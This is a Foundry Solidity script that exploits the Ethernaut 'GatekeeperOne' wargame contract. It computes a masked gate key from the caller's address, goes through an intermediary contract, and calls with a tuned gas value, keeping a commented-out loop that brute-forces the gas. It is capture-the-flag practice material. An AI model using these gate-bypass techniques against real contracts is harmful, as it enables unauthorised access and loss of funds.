// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Script.sol";

import {Intermediary, GatekeeperOne} from "./../../test/ethernaut/gatekeeper/GatekeeperOne.sol";

contract ExploitGatekeeper is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");
        address me = vm.addr(pk);

        bytes8 mask = bytes8(bytes4(type(uint32).max));
        bytes8 last = bytes8(uint64(uint16(uint160(me))));
        bytes8 key = mask | last;

        vm.startBroadcast(pk);

        // address gateAddr = 0x08530Dd8559471e4477c13436763914E8c3c9724;

        GatekeeperOne gate = GatekeeperOne(
            0x10c2237eCFd61bD097a0168A783ea482B09AC307
        );

        Intermediary i = new Intermediary(
            0x10c2237eCFd61bD097a0168A783ea482B09AC307
        );

        // uint256 gasPreComputed = 32723;

        // uint256 withGas = gasPreComputed + 5624;
        // bool success;
        // while (!success) {
        //     (success, ) = address(i).call{gas: withGas}(
        //         abi.encodeWithSelector(i.enter.selector, key)
        //     );
        //     if (success) {
        //         break;
        //     }
        //     withGas -= 1;
        // }
        // console.log("With Gas:", withGas);
        uint256 left = gasleft();
        i.enter{gas: 36620}(key);
        console.log("Cost", left - gasleft());

        // address(i).call{gas: withGas}(
        //     abi.encodeWithSelector(i.enter.selector, key)
        // );
        address entrant = gate.entrant();
        console.log("Entrant", entrant);

        vm.stopBroadcast();
    }
}
